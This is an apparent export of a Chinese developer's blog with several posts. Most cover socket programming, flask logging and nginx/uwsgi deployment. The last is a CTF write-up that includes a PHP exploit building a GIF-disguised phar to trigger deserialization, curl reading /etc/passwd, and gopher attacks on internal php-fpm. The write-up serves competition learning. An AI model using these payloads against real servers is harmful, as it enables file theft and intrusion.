[{"title":"Linux 实验 socket网络编程","date":"2020-11-04T16:00:00.000Z","path":"2020/11/05/Note/Linux实验socket网络编程/","text":"Linux 实验 socket网络编程要求编写两个程序，一个Server，一个Client，分别运行在两个shell窗口，通过Socket实现两个Shell窗口的即时通信 （即在A窗口输入Hello，B窗口会立即显示“Client：Hello”。B窗口也可以输入任意内容，比如“Nice to meet you”，在A窗口立即显示“Server： Nice to meet you”。）（提示：本地地址是127.0.0.1，端口最好10000以上，避免占据其他应用端口。注意访问权限问题。） Server.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet&#x2F;in.h&gt;#include &lt;arpa&#x2F;inet.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;sys&#x2F;socket.h&gt;#include &lt;sys&#x2F;wait.h&gt;#define PORT 23456#define SERVER_ADDR &quot;127.0.0.1&quot;int server_socket,client_socket;void func_kill(int sig)&#123; &#x2F;&#x2F; printf(&quot;%d &quot;,close(server_socket)); &#x2F;&#x2F; printf(&quot;%d &quot;,close(client_socket)); close(server_socket); close(client_socket); signal(SIGINT,SIG_DFL); exit(3);&#125;int main(int argc, char *argv[])&#123; &#x2F;&#x2F; 俩个子进程 pid1 用于接收 pid2 用于发送 int pid1,pid2; &#x2F;&#x2F; 等待pid退出信号 int pid_exit_status; &#x2F;&#x2F; 绑定端口结果 监听端口结果 int Bind_res,Listen_res; &#x2F;&#x2F; 客户端地址块大小 socklen_t clientaddr_len; &#x2F;&#x2F; 服务端地址块 客户端地址块 struct sockaddr_in serveraddr,clientaddr; &#x2F;&#x2F; 存储接受的消息 发送的消息 char recv_msg[100],send_msg[100]; &#x2F;&#x2F;创建服务socket server_socket &#x3D; socket(AF_INET,SOCK_STREAM,0); if(server_socket&#x3D;&#x3D;-1) &#123; perror(&quot;The socket is error!\\n&quot;); exit(0); &#125; &#x2F;&#x2F; 设置端口绑定,取消TIME_WAIT,避免占用 struct linger ling; ling.l_onoff &#x3D; 1; ling.l_linger &#x3D; 0; setsockopt(server_socket,SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling)); &#x2F;&#x2F; 设置服务端地址 serveraddr.sin_family &#x3D; AF_INET; &#x2F;&#x2F;ipv4 serveraddr.sin_port &#x3D; htons(PORT); &#x2F;&#x2F;端口 inet_aton(SERVER_ADDR,&amp;serveraddr.sin_addr); &#x2F;&#x2F;地址 bzero(serveraddr.sin_zero,8); &#x2F;&#x2F;绑定 和 监听 端口 Bind_res &#x3D; bind(server_socket, (struct sockaddr *)(&amp;serveraddr),sizeof(serveraddr)); if(Bind_res&#x3D;&#x3D;-1) &#123; perror(&quot;The bind is error!\\n&quot;); exit(0); &#125; Listen_res &#x3D; listen(server_socket,2); if(Listen_res&#x3D;&#x3D;-1) &#123; perror(&quot;The listen is error!\\n&quot;); exit(0); &#125; printf(&quot;server start!\\n&quot;); &#x2F;&#x2F; 捕获 ctrl+c信号 signal(SIGINT,func_kill); &#x2F;&#x2F; 子进程pid1用于发送 pid1&#x3D; fork(); &#x2F;&#x2F; 用于主进程阻塞 while(1) &#123; if(pid1&#x3D;&#x3D;0) &#123; &#x2F;&#x2F;等待连接 clientaddr_len &#x3D; sizeof(struct sockaddr_in); memset(&amp;clientaddr, &#39;\\0&#39;, sizeof(struct sockaddr_in)); client_socket &#x3D; accept(server_socket, (struct sockaddr*)(&amp;clientaddr), &amp;clientaddr_len); if(client_socket &#x3D;&#x3D; -1) &#123; perror(&quot;The accept is error!\\n&quot;); exit(0); &#125; else &#123; &#x2F;&#x2F; 打印连接的子进程ip地址和端口信息 char clntName[1024]; if (inet_ntop(AF_INET, &amp;clientaddr.sin_addr.s_addr, clntName, sizeof(clntName)) !&#x3D; NULL) &#123; printf(&quot;connecting client ip: %s port: %d\\n&quot;, clntName, ntohs(clientaddr.sin_port)); &#125; else &#123; printf(&quot;client address get failed\\n&quot;); &#125; &#125; printf(&quot;client connected success!\\n&quot;); &#x2F;&#x2F; pid2 用于接收 pid2&#x3D;fork(); if(pid2&#x3D;&#x3D;0) &#123; &#x2F;&#x2F; pid2 阻塞 while (1) &#123; &#x2F;&#x2F; 当子进程pid1检测到client断开连接后,及时退出子进程pid2,关闭socket signal(SIGHUP, func_kill); fgets(send_msg, sizeof(send_msg), stdin); send(client_socket, send_msg, sizeof(send_msg), 0); &#125; &#125;else&#123; &#x2F;&#x2F; pid1 阻塞 while (1) &#123; int result &#x3D; recv(client_socket,recv_msg, sizeof(recv_msg), 0); &#x2F;&#x2F; 子进程pid1检测到client断开连接 if (result &lt;&#x3D; 0) &#123; printf(&quot;client connect close\\n&quot;); close(client_socket); kill(pid2,SIGHUP); break; &#125; &#x2F;&#x2F; 正常连接 printf(&quot;Client:%s&quot;,recv_msg); &#125; &#125; &#125; else &#123; &#x2F;&#x2F; 阻塞父进程,pid1退出了就把父进程也退出 int exit_pid &#x3D; wait(&amp;pid_exit_status); if (exit_pid &#x3D;&#x3D; pid1) &#123; &#x2F;&#x2F; printf(&quot;paraent process quit!\\n&quot;); close(server_socket); close(client_socket); exit(0); &#125; &#125; &#125; return 0;&#125; Client.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet&#x2F;in.h&gt;#include &lt;arpa&#x2F;inet.h&gt;#include &lt;sys&#x2F;socket.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;sys&#x2F;wait.h&gt;#define PORT 23456#define SERVER_ADDR &quot;127.0.0.1&quot;int server_socket,client_socket;void func_kill(int sig)&#123; close(server_socket); close(client_socket); signal(SIGINT,SIG_DFL); exit(3);&#125;int main(int argc, char *argv[])&#123; &#x2F;&#x2F; 俩个子进程 pid1 用于接收 pid2 用于发送 int pid1,pid2; &#x2F;&#x2F; 等待pid退出信号 int pid_exit_status; &#x2F;&#x2F; 服务端地址 struct sockaddr_in serveraddr; char recv_msg[100],send_msg[100]; &#x2F;&#x2F;创建socket server_socket &#x3D; socket(AF_INET,SOCK_STREAM,0); if(server_socket&#x3D;&#x3D;-1) &#123; perror(&quot;The socket is error!\\n&quot;); exit(0); &#125; &#x2F;&#x2F; 设置端口绑定,取消TIME_WAIT,避免占用 struct linger ling; ling.l_onoff &#x3D; 1; ling.l_linger &#x3D; 0; setsockopt(server_socket,SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling)); &#x2F;&#x2F; 设置服务端地址 serveraddr.sin_family &#x3D; AF_INET; serveraddr.sin_port &#x3D; htons(PORT); inet_aton(SERVER_ADDR,&amp;serveraddr.sin_addr); bzero(serveraddr.sin_zero,8); &#x2F;&#x2F;连接socket client_socket &#x3D; connect(server_socket, (struct sockaddr *)(&amp;serveraddr),sizeof(serveraddr)); if(client_socket&#x3D;&#x3D;-1) &#123; perror(&quot;The connect is error!\\n&quot;); exit(0); &#125; printf(&quot;server connect success！\\n&quot;); &#x2F;&#x2F; 捕获 ctrl+c信号 signal(SIGINT,func_kill); &#x2F;&#x2F; 子进程pid1用于发送 pid1&#x3D;fork(); &#x2F;&#x2F; 主进程阻塞 while(1) &#123; if (pid1&#x3D;&#x3D;0) &#123; &#x2F;&#x2F; 子进程pid2 用于发送 pid2&#x3D;fork(); if(pid2&#x3D;&#x3D;0) &#123; &#x2F;&#x2F; pid2阻塞 while (1) &#123; signal(SIGHUP,func_kill); fgets(send_msg,sizeof(send_msg),stdin); send(server_socket,send_msg,sizeof(send_msg),0); &#125; &#125; else &#123; &#x2F;&#x2F; pid1阻塞 while (1) &#123; int result &#x3D; recv(server_socket,recv_msg,sizeof(recv_msg),0); if (result&lt;&#x3D;0) &#123; printf(&quot;server close\\n&quot;); close(server_socket); close(client_socket); &#x2F;&#x2F; 与服务器断开连接,通知pid2退出,关闭socket kill(pid2,SIGHUP); exit(1); &#125; printf(&quot;Server:%s&quot;,recv_msg); &#125; &#125; &#125; else &#123; &#x2F;&#x2F; 阻塞父进程,pid1退出了就把父进程也退出 int exit_pid &#x3D; wait(&amp;pid_exit_status); if (exit_pid&#x3D;&#x3D;pid1) &#123; &#x2F;&#x2F; printf(&quot;paraent process quit!\\n&quot;); close(server_socket); close(client_socket); exit(0); &#125; &#125; &#125; return 0;&#125; 运行结果","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"Linux","slug":"Linux","permalink":"https://yanmymickey.github.io/tags/Linux/"},{"name":"socket","slug":"socket","permalink":"https://yanmymickey.github.io/tags/socket/"}]},{"title":"Linux 实验 socket网络编程","date":"2020-11-04T16:00:00.000Z","path":"2020/11/05/Note/夜神安卓模拟器打开Windows绿屏bug/","text":"夜神模拟器打开后Windows绿屏这货没有像vmware一样的异常处理，但是其模拟器运行环境是和vmware差不多的虚拟机,如果Windows开了wsl,将会和wsl的hype-V冲突,导致系统崩溃。 解决办法： 通过命令关闭Hyper-V（控制面板关闭Hyper-V起不到决定性作用，要彻底关闭Hyper-V） 以管理员身份运行Windows Powershell (管理员)（Windows键+X） 运行下面命令并重启电脑： 12#关闭hype-Vbcdedit &#x2F;set hypervisorlaunchtype off 再次打开模拟器就不会绿屏了。","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"微信小程序百度地图API移动选点","date":"2020-11-04T16:00:00.000Z","path":"2020/11/05/Note/微信小程序百度地图api移动选点/","text":"微信小程序百度地图API移动选点因为业务需要使用百度地图API，参考一位大佬编写腾讯API的思路和方法，改造成百度地图API移动选点。 思路：wxml前端部分就不改了，用用大佬的。 微信地图API获取当前位置经纬度信息-&gt;百度地图API逆地址解析方法,获取当前位置名称,省市区等信息-&gt;setData mapChange函数监听地图移动-&gt;设置一个定时器达到轮询的目的，设置isGet参数判断onLoad中的wx.getlocation是否执行完。-&gt;nearby_search以当前的地址名称为搜索关键字,带上经纬度进行POI检索获取附近地址列表 注意：页面初始化时会因为scale改变触发一次mapChange函数，由于JS单线程的特性，页面初始化与page初始化时同时进行的，如果先执行wx.getlocation那没有问题，执行完给经纬度赋值了，mapChange可以正常执行，如果mapChange先执行，那么此时经纬度没有初始值为空，mapChange返回的经纬度信息也为空，导致获取附近地址信息也为空。也可以使用getLocation中也执行一次获取附近地址信息的函数，但是这样会多调用一次API，调用API还是挺耗时。 getsuggest根据用户在输入框输入的关键字进行POI热词检索，搜索当前城市的热词列表。 这三个是主要功能，其他的关于选择省市区三级联动的部分，由于百度地图API没有提供完整的省市区县列表（可能有是我没找到），我也懒得封装了，就阉割掉了。 代码贴一下关键的JS部分的代码，详细代码查看Github，记得在app.js填写的你的百度地图调用密匙ak 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284import bmap from &#39;..&#x2F;..&#x2F;utils&#x2F;bmap-wx&#39;;import &#39;..&#x2F;..&#x2F;utils&#x2F;util&#39;let app &#x3D; getApp();let BMap &#x3D; new bmap.BMapWX(&#123; ak: app.globalData.ak,&#125;);Page(&#123; data: &#123; addListShow: false, addressName: &#39;&#39;, currentRegion: &#123; province: &#39;选择城市&#39;, city: &#39;选择城市&#39;, district: &#39;选择城市&#39;, &#125;, isGet: false, latitude: &#39;&#39;, longitude: &#39;&#39;, centerData: &#123;&#125;, nearList: [], selectedId: 0, &#125;, onLoad: function () &#123; let that &#x3D; this; let fail &#x3D; function (data) &#123; console.log(data) &#125;; let success &#x3D; function (data) &#123; &#x2F;&#x2F; console.log(data); let wxMarkerData &#x3D; data.wxMarkerData; that.setData(&#123; isGet: true, addressName: wxMarkerData[0].address, currentRegion: data.originalData.result.addressComponent, centerData: wxMarkerData, latitude: wxMarkerData[0].latitude, longitude: wxMarkerData[0].longitude &#125;); &#125; that.mapCtx &#x3D; wx.createMapContext(&#39;myMap&#39;) &#x2F;&#x2F;微信API定位,获取当前位置经纬度 wx.getLocation(&#123; type: &#39;wgs84&#39;, success(res) &#123; &#x2F;&#x2F;console.log(res) BMap.regeocoding(&#123; location: res.latitude + &#39;,&#39; + res.longitude, fail: fail, success: success, &#125;); &#125;, fail(err) &#123; &#x2F;&#x2F;console.log(err) wx.hideLoading(&#123;&#125;); wx.showToast(&#123; title: &#39;定位失败&#39;, icon: &#39;none&#39;, duration: 1500 &#125;) setTimeout(function () &#123; wx.navigateBack(&#123; delta: 1 &#125;) &#125;, 1500) &#125; &#125;) &#125;, onReady: function () &#123; &#125;, &#x2F;&#x2F;监听拖动地图，拖动结束根据中心点更新页面 mapChange: function (e) &#123; let that &#x3D; this; let fail &#x3D; function (data) &#123; console.log(data) &#125;; let success &#x3D; function (data) &#123; let wxMarkerData &#x3D; data.wxMarkerData[0]; &#x2F;&#x2F; console.log(wxMarkerData); that.setData(&#123; addressName: wxMarkerData.address, currentRegion: data.originalData.result.addressComponent, &#125;); let location &#x3D; wxMarkerData.latitude + &#39;,&#39; + wxMarkerData.longitude; that.nearby_search(wxMarkerData.address, location); &#125;; &#x2F;&#x2F;&amp;&amp; (e.causedBy &#x3D;&#x3D; &#39;scale&#39; || e.causedBy &#x3D;&#x3D; &#39;drag&#39;) if (e.type &#x3D;&#x3D; &#39;end&#39; &amp;&amp; (e.causedBy &#x3D;&#x3D; &#39;scale&#39; || e.causedBy &#x3D;&#x3D; &#39;drag&#39;)) &#123; &#x2F;*用一个轮询判断getlocation是否执行完, 保证定位完再执行mapchange, 主要是解决map组件初始化时会因为scale改变触发一次当前函数 *&#x2F; let i &#x3D; setInterval(function () &#123; let &#123; isGet &#125; &#x3D; that.data; if (isGet) &#123; clearInterval(i); &#x2F;&#x2F;先调用微信组件获取地图中心点位置经纬度 that.mapCtx.getCenterLocation(&#123; success: function (res) &#123; &#x2F;&#x2F; console.log(res) that.setData(&#123; nearList: [], latitude: res.latitude, longitude: res.longitude, &#125;); &#x2F;&#x2F;百度逆地址解析,将经纬度转换为地址信息 BMap.regeocoding(&#123; location: res.latitude + &#39;,&#39; + res.longitude, fail: fail, success: success, &#125;); &#125; &#125;); &#125; &#125;, 500) &#125; &#125;, &#x2F;&#x2F;重新定位 reload: function () &#123; this.onLoad(); &#125;, onShow: function () &#123; &#125;, &#x2F;&#x2F; 根据关键词搜索附近位置 nearby_search: function (addressName, location) &#123; let that &#x3D; this; &#x2F;*发起POI检索请求,搜索当前位置附近地址信息 如果不知道参数可以通过ctrl+鼠标左键进入类内部查看方法 *&#x2F; BMap.search(&#123; &quot;query&quot;: addressName || &#39;房地产&#39;, location: location, page_size: 20, page_index: 1, success: function (res) &#123; &#x2F;&#x2F; console.log(res); let sug &#x3D; []; let wxMarkerData &#x3D; res.wxMarkerData; &#x2F;&#x2F; console.log(wxMarkerData) for (let i of wxMarkerData) &#123; &#x2F;&#x2F; console.log(i) sug.push(&#123; &#x2F;&#x2F; 获取返回结果，放到sug数组中 title: i.title, id: i.id, addr: i.address, latitude: i.latitude, longitude: i.longitude &#125;); &#125; if (sug.length &gt; 0) &#123; that.setData(&#123; selectedId: 0, centerData: sug[0], nearList: sug, &#125;); &#125; &#125;, fail(err) &#123; console.log(err) wx.hideLoading(&#123;&#125;); wx.showToast(&#123; title: &#39;获取附近地址信息失败&#39;, icon: &#39;none&#39;, duration: 1500 &#125;) setTimeout(function () &#123; wx.navigateBack(&#123; delta: 1 &#125;) &#125;, 1500) &#125;, &#125;); &#125;, &#x2F;&#x2F;显示搜索列表 showAddList: function () &#123; this.setData(&#123; addListShow: true &#125;) &#125;, &#x2F;&#x2F;根据关键词搜索匹配位置 getsuggest: function (ev) &#123; let that &#x3D; this; that.setData(&#123; addListShow: true &#125;) let keyWold &#x3D; ev.detail.value.trim(), &#123; currentRegion &#125; &#x3D; that.data, searchCity &#x3D; currentRegion.city; if (keyWold !&#x3D; &quot;&quot;) &#123; &#x2F;* 根据输入的关键字,在当前城市搜索关键字地址信息 *&#x2F; BMap.suggestion(&#123; query: keyWold, region: searchCity, &#x2F;&#x2F;市 city_limit: true, &#x2F;&#x2F; 搜索结果处理 success: res &#x3D;&gt; &#123; let newList &#x3D; res.result.filter(item &#x3D;&gt; &#123; return item.location; &#125;); &#x2F;&#x2F; console.log(newList) that.setData(&#123; nearList: newList, &#125;); &#125;, fail(err) &#123; console.log(err) &#125; &#125;); &#125; else &#123; if (!that.data.addListShow) &#123; that.setData(&#123; addListShow: true &#125;) &#125; &#125; &#125;, &#x2F;&#x2F;点击选择地图下方列表某项 chooseCenter: function (e) &#123; let that &#x3D; this; let id &#x3D; e.currentTarget.id; let nearList &#x3D; that.data.nearList; that.setData(&#123; selectedId: id, centerData: nearList[id], latitude: nearList[id].latitude, longitude: nearList[id].longitude, &#125;); &#125;, &#x2F;&#x2F;点击选择搜索结果 backfill: function (e) &#123; let that &#x3D; this; let id &#x3D; e.currentTarget.id; let nearList &#x3D; that.data.nearList; that.setData(&#123; selectedId: id, centerData: nearList[id], addListShow: false, latitude: nearList[id].latitude, longitude: nearList[id].longitude &#125;); &#x2F;&#x2F; 选择完返回地图页面 &#x2F;&#x2F; let location &#x3D; nearList[id].latitude + &#39;,&#39; + nearList[id].longitude; &#x2F;&#x2F; that.nearby_search(nearList[id].title, location); &#x2F;&#x2F; console.log(that.data.centerData) &#x2F;&#x2F;选择完返回上一页 wx.navigateBack(&#123; delta: 1 &#125;) &#125;, &#x2F;&#x2F;返回上一页或关闭搜索页面 back1: function () &#123; wx.navigateBack(&#123; delta: 1 &#125;) &#x2F;&#x2F; if (this.data.addListShow) &#123; &#x2F;&#x2F; this.setData(&#123; &#x2F;&#x2F; addListShow: false &#x2F;&#x2F; &#125;) &#x2F;&#x2F; &#125; &#x2F;&#x2F;返回上一页 &#x2F;&#x2F; else &#123; &#x2F;&#x2F; wx.navigateBack(&#123; &#x2F;&#x2F; delta: 1 &#x2F;&#x2F; &#125;) &#x2F;&#x2F; &#125; &#125;, &#x2F;&#x2F;确认选择地址 selectedOk: function () &#123; console.log(this.data.centerData) &#125;&#125;) Reference微信小程序——打开地图 选择位置 完整功能实现代码(定位，检索周边，可移动选点，可搜索，腾讯地图API) 代码GitHub——微信小程序百度地图API移动选点","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"wechatweb","slug":"wechatweb","permalink":"https://yanmymickey.github.io/tags/wechatweb/"}]},{"title":"配置本地站点方法","date":"2020-11-04T16:00:00.000Z","path":"2020/11/05/Note/配置本地站点方法/","text":"配置本地站点方法第一步修改nginx配置文件,可以选择多端口多站点,或者80端口多站点,一般只需修改server_name和root 第二步同步hosts,在hosts文件里面添加本地站点","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"flask自定义日志","date":"2020-08-05T16:00:00.000Z","path":"2020/08/06/Note/flask自定义日志/","text":"flask自定义日志logger首先我们要了解python实现记录程序日志功能可以使用logging模块，关于logging的用法，继承类自定义日志，日志等级，等等。 日志输出到文件，用FileHandler，RotatingFileHandler app.logger看看app.logger源码 得到几点信息 在初始化app时,便创建了一个app.name的日志记录器,其是继承于python的logging模块的 该记录器已经添加一个default_handler 写一个小功能:flask实现类似nginx的access.log 12345678910111213141516171819202122232425262728293031323334from flask import Flask, requestfrom flask.logging import default_handlerfrom logging import Formatter, INFOfrom logging.handlers import RotatingFileHandlerapp &#x3D; Flask(__name__)app.debug &#x3D; True# 主路由index page@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;Get&#39;])def index(): return &quot;hello&quot;# 在每一次请求前执行@app.before_requestdef log_each_request(): params &#x3D; request.args if request.args is None else &#39;&#39; app.logger.info(&#39;&#123;&#125;-&#123;&#125;-&#123;&#125;&#39;.format(request.method, request.path, params))if __name__ &#x3D;&#x3D; &#39;__main__&#39;: # 日志格式化类 记录时间 等级 代码行 日志信息 formatter &#x3D; Formatter(&#39;%(asctime)s - %(levelname)s - %(lineno)d - %(message)s&#39;) info_log_path &#x3D; &#39;logs&#x2F;flask.log&#39; # 自动分割日志功能的Handler file_handler &#x3D; RotatingFileHandler(info_log_path, maxBytes&#x3D;10 * 1024 * 1024, backupCount&#x3D;10) file_handler.setFormatter(formatter) file_handler.setLevel(INFO) if not app.debug: app.logger.removeHandler(default_handler) app.logger.addHandler(file_handler) app.run() 如果我们将这行代码注释掉 app.debug=True的情况下，日志可以输出，但是会将控制台所有的信息都输出到日志文件，这是我们不想的，我们只想要app.logger.info写的内容。 app.debug=False的情况下，日志不工作了，之前还能全部输出只是有些是我们不想要的，现在都没了，就好像女朋友说分手就分手。 Why？跟进default_handler default_handler是一个StreamHandler，将日志记录输出发送到流，例如sys.stdout，sys.stderr或任何类似文件的对象（或更准确地说，是支持write() 和flush()方法的任何对象） 所以控制台的输出也会一起输出至你的文件了 app.debug问题：应用程序控制台中看到的输出来自底层的Werkzeug记录器，没有设置logleve，日志就没有了。 然后然后，然后干嘛？ 然后就去玩呀😝","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"python","slug":"python","permalink":"https://yanmymickey.github.io/tags/python/"},{"name":"flask","slug":"flask","permalink":"https://yanmymickey.github.io/tags/flask/"}]},{"title":"部署nginx+uwsgi+flask","date":"2020-08-05T16:00:00.000Z","path":"2020/08/06/Note/部署nginx+uwsgi+flask/","text":"部署nginx+uwsgi+flask服务器配置Centos7.6 python3.7 nginx 1.12 项目文件项目文件最好放在一个权限较低的目录，当然，配置好权限也是可以的 将flask项目通过ftp或者git上传到/home/project uwsgi虚拟环境什么是虚拟环境? virtualenv - 廖雪峰 简而言之就是将当前项目需要用到的一些第三方库分开存储，不直接放置到系统目录，这样可以保证环境的独立性和稳定性，系统目录中的库升级不会影响到项目。 新建虚拟环境123456789# 安装pip3 install virtualenv# 进入项目目录cd &#x2F;home&#x2F;project# 更改目录所有者sudo chown -R yourUserName:yourUserName 项目路径&#x2F;cd 项目路径&#x2F;# 新建虚拟环境，保存当前项目所需依赖 sudo virtualenv venv 进入虚拟环境1source venv&#x2F;bin&#x2F;activate 安装依赖12345# 虚拟环境中就不要用sudo了，不然又是调用系统目录的pip了# 在虚拟环境中安装项目所需依赖pip install -r requirements.txt# 在虚拟环境中安装 uwsgi 和 uwsgi的状态监控器pip install uwsgi uwsgitop 编写uwsgi配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748vim uwsgi.ini[uwsgi]# python 启动程序文件 app.run所在的文件名wsgi-file &#x3D; # python 程序内用以启动的变量名 appcallable &#x3D; app# 进程数processes &#x3D; 5# 线程数threads &#x3D; 2#主进程master&#x3D;true# 指向网站目录chdir&#x3D;&#x2F;home&#x2F;project&#x2F;项目路径&#x2F;# socket文件，配置nginx时候使用 # 也可以写出ip:port端口模式# 比如 127.0.0.1:5001# 端口模式的话nginx也要一个端口,就挺啰嗦的socket&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.sock chmod-socket&#x3D;666#http模式,不需要配合nginx即可单独使用#但是nginx是c编写的,解析http请求的效率要高很多#建议使用socket加nginx的模式#http&#x3D;0.0.0.0:5001# status文件，可以查看uwsgi的运行状态stats&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.status # pid文件，通过该文件可以控制uwsgi的重启和停止 pidfile&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.pid # 日志文件，通过该文件查看uwsgi后台运行的日志daemonize&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.log logfile-chmod&#x3D;644# uid&#x3D;# gid&#x3D;# uwsgi的进程名称前缀# procname-prefix-spaced&#x3D;mysite # py文件修改自动加载,生成环境不建议开启#py-autoreload&#x3D;true buffer-size &#x3D; 32768 启停uwsgi1234567# 虚拟环境运行# 启动uwsgi --ini uwsgi.ini # 重启uwsgi --reload uwsgi.pid # 关闭uwsgi --stop uwsgi.pid 服务监控 读取uwsgi实时状态,json字符串形式 12# 虚拟环境运行uwsgi --connect-and-read uwsgi&#x2F;uwsgi.status uwsgitop 12# 虚拟环境运行uwsgitop uwsgi&#x2F;uwsgi.status 退出虚拟环境1deactivate nginx安装编译安装或者用包管理安装都是可以的，满足项目需求就可以 1yum install nginx 配置文件目录：/etc/nginx 配置文件: /etc/nginx/nginx.conf 站点文件源文件：/etc/nginx/sites-available 站点文件激活文件夹：/etc/nginx/sites-enabled 说明： centos yum安装的nginx是没用下面俩个站点目录的，手动创建，然后在nginx.conf中include/etc/nginx/sites-enabled/* 将站点文件源文件写在sites-available目录，添加软链接到sites-enabled，如若要关闭站点，只需要将 sites-enabled目录下的软链接删除即可 日志目录：/var/log/nginx/ 配置站点1234567891011121314151617181920212223242526cd &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;sudo vim 项目名称.confserver &#123; # 有域名就配置server_name为域名,端口监听80 # 监听端口 listen 5001; server_name localhost; access_log &#x2F;var&#x2F;log&#x2F;project_name&#x2F;project_name_access.log; error_log &#x2F;var&#x2F;log&#x2F;project_name&#x2F;project_name_error.log index index.html; #动态请求 location &#x2F; &#123; include uwsgi_params; uwsgi_pass unix:&#x2F;&#x2F;&#x2F;home&#x2F;project&#x2F;项目名称&#x2F;uwsgi&#x2F;uwsgi.sock; &#125;&#125;#创建软链接sudo ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;项目名称.conf &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;项目名称.conf#检验配置文件sudo nginx -tsudo systemctl restart nginx.service 最后访问站点是否可以访问 排查问题参考 云服务器确认端口是否开启可访问 服务器本地是否可访问 curl http://127.0.0.1:port 有响应检查服务器端口，无响应检查nginx ip：port是否可访问 有响应，但是只是出现nginx，检查uwsgi 无响应，检查服务器端口，然后再检查nginx 注意权限问题引发的日志或者程序拒绝服务500等错误码","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"python","slug":"python","permalink":"https://yanmymickey.github.io/tags/python/"},{"name":"flask","slug":"flask","permalink":"https://yanmymickey.github.io/tags/flask/"},{"name":"linux","slug":"linux","permalink":"https://yanmymickey.github.io/tags/linux/"}]},{"title":"[NCTF2019]phar matches everything","date":"2020-05-01T16:00:00.000Z","path":"2020/05/02/CTF_WP/[NCTF2019]phar matches everything/","text":"[NCTF2019]phar matches everything 分析源码 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass Easytest&#123; protected $test; public function funny_get()&#123; return $this-&gt;test; &#125;&#125;class Main &#123; public $url; public function curl($url)&#123; $ch &#x3D; curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output&#x3D;curl_exec($ch); curl_close($ch); return $output; &#125;public function __destruct()&#123; $this_is_a_easy_test&#x3D;unserialize($_GET[&#39;careful&#39;]); if($this_is_a_easy_test-&gt;funny_get() &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123; echo $this-&gt;curl($this-&gt;url); &#125; &#125; &#125;if(isset($_POST[&quot;submit&quot;])) &#123; $check &#x3D; getimagesize($_POST[&#39;name&#39;]); if($check !&#x3D;&#x3D; false) &#123; echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; &#125; else &#123; echo &quot;File is not an image.&quot;; &#125;&#125;?&gt; 两次序列化第一个是利用getimagesize($file_path)触发phar反序列化，触发的反序列化影响Main类 第二个很简单,要是Easytest中的test=1 利用curl读取文件 exp.php 12345678910111213141516171819202122&lt;?phpclass Easytest &#123; protected $test &#x3D; &#39;1&#39;;&#125;class Main &#123; public $url &#x3D;&#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;;&#125;$a &#x3D; new Easytest();echo serialize($a);echo urlencode(serialize($a));$b &#x3D; new Main();@unlink(&quot;exp.phar&quot;);$phar &#x3D; new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;GIF89a&#39; . &quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($b);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();rename(&#39;exp.char&#39;, &quot;exp.gif&quot;); 首先上传exp.gif 然后利用catchmime.php传参触发反序列化 careful用来触发2 1name&#96;用来触发&#96;phar 改变url读取hosts,因为这道题想让我们打内网 我读取到了173.187.197.10,再用http协议读一下http://173.187.197.10,发现就是当前页面,再读一下 http://173.187.197.11 php-fpm未授权漏洞php-fpm未授权漏洞 使用链接中的exp 再使用gopher协议使用exp生成的payload 先打phpinfo();可以得知需要绕过open_basedir 加上绕过open_basedir的payload就可以了 1&lt;?php 